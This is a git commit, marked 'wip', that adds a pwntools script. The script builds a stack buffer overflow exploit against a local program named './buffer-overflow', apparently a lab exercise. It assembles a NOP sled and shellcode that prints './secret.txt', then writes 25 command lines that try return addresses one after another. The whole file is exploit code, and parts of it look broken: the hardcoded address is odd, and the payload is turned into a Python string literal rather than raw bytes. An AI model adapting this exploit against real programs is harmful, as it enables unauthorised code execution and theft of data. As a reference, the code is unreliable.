ae5ead4cf4550ad408be69247761d95a7ad88ec5
ivfiev <filjko@ya.ru>
2024-06-10 19:58:10 +0100

    wip

---
+++ pwntools/main.py
@@ -0,0 +1,23 @@
+from pwn import *
+
+context.update(arch='amd64', os='linux')
+
+nop = asm(shellcraft.nop())
+code = asm(shellcraft.cat('./secret.txt\n'))
+program_name = "./buffer-overflow"
+addr_offset = 140
+addr = 0xffffffffffffe300 - 100
+
+bytes = addr_offset - len(code)
+sled = int(bytes / 3 * 2)
+rem = bytes - sled
+
+f = open("./output", "w")
+lines = ""
+
+for x in range(25):
+    shc = nop * sled + code + nop * rem + p64(addr + 16 * x)
+    lines += f"""{program_name} ${str(shc)[1:]}\n"""
+
+f.write(lines)
+f.close()
